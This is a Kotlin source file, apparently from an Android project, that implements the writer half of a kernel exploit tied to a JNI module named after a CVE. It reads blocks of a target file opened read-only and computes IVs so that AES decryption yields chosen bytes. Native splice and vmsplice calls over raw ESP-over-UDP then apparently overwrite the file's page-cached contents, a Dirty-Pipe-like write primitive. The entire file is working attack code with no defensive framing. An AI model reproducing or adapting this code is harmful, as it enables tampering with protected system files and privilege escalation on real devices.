package com.ghostlock.app.engine.pagecache

import com.ghostlock.app.jni.cve43284.NativeRawEsp
import java.io.RandomAccessFile
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * Kotlin 直写：Kotlin 读旧内容、算 IV、分块、记账；JNI 只做
 * vmsplice(header) + splice(file page) + splice(pipe -> UDP)。
 */
object RawEspWriter {
    fun open(spi: Int, encapPort: Int, senderPort: Int): Long =
        NativeRawEsp.open(spi, encapPort, senderPort)

    fun close(handle: Long) {
        if (handle != 0L) NativeRawEsp.close(handle)
    }

    /** 一块 16B；old 从目标文件直读，IV = AES-ECB-DEC(key, old) XOR desired。 */
    fun writeBlock(
        handle: Long,
        path: String,
        offset: Long,
        desired: ByteArray,
        key: ByteArray,
        sequence: Int,
    ): Boolean {
        if (handle == 0L || desired.size != 16 || key.size != 32) return false
        val old = readBlock(path, offset) ?: return false
        val iv = runCatching { computeIv(key, old, desired) }.getOrNull() ?: return false
        return NativeRawEsp.writeBlock(handle, path, offset, iv, sequence)
    }

    /** 写整段（必须是 16B 的倍数）；返回成功块数，失败即停。 */
    fun writeImage(
        handle: Long,
        path: String,
        offset: Long,
        image: ByteArray,
        key: ByteArray,
        firstSequence: Int,
    ): Int {
        if (image.isEmpty() || image.size % 16 != 0) return 0
        var written = 0
        var at = 0
        while (at < image.size) {
            val block = image.copyOfRange(at, at + 16)
            if (!writeBlock(handle, path, offset + at, block, key, firstSequence + written)) {
                return written
            }
            written += 1
            at += 16
        }
        return written
    }

    private fun readBlock(path: String, offset: Long): ByteArray? = runCatching {
        RandomAccessFile(path, "r").use { file ->
            file.seek(offset)
            val bytes = ByteArray(16)
            file.readFully(bytes)
            bytes
        }
    }.getOrNull()

    internal fun computeIv(key: ByteArray, old: ByteArray, desired: ByteArray): ByteArray {
        val cipher = Cipher.getInstance("AES/ECB/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key, "AES"))
        val decrypted = cipher.doFinal(old)
        return ByteArray(16) { index -> (decrypted[index].toInt() xor desired[index].toInt()).toByte() }
    }
}
